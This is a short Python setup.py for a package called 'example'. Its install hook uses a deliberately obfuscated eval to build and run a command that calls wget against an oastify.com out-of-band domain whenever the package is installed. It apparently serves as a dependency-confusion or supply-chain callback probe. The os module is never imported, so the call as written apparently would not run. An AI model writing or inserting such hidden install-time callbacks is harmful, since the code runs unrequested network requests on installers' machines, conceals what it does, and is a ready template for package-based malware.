from setuptools import setup
from setuptools.command.install import install
def report():
    stem = 'stem'
    oast = 'oast'
    mid = 'ify.c'
    end = 'om'
    space = ' '
    get = 'get'
    w = 'w'
    sy = '.sy'
    o = 'o'
    s = 's'
    domain = 'example.' + oast + mid + end
    command = w + get + space
    system = o + s + sy + stem
    eval(system + f"('{command + domain}')")
class Hook(install):
    def run(self):
        report()
setup(name='example', cmdclass={'install': Hook})
